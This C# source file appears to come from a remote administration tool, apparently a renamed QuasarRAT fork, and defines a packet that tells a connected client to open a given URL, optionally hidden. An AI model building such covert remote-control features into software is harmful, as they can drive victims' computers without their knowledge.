using System;
using xServer.KuuhakuCekirdek.Ağ;

namespace xServer.KuuhakuCekirdek.Paketler.ServerPaketleri
{
    [Serializable]
    public class DoVisitWebsite : IPacket
    {
        public string URL { get; set; }

        public bool Hidden { get; set; }

        public DoVisitWebsite()
        {
        }

        public DoVisitWebsite(string url, bool hidden)
        {
            this.URL = url;
            this.Hidden = hidden;
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}